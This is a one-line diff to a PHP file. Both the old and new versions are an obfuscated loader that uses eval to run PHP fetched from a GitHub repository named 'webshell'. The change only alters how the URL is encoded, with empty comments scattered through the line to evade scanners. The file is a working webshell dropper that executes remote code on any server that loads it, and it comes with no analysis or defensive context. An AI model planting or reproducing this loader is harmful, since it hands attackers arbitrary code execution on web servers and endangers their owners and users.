@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(urldecode(rawurldecode("https%253A%252F%252Fraw.githubusercontent.com%252Fjustikail%252Fwebshell%252Fmain%252Ftemp.php"))));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(urldecode(urlencode(rawurldecode(rawurlencode("https://raw.githubusercontent.com/justikail/webshell/main/temp.php"))))));/**/?>
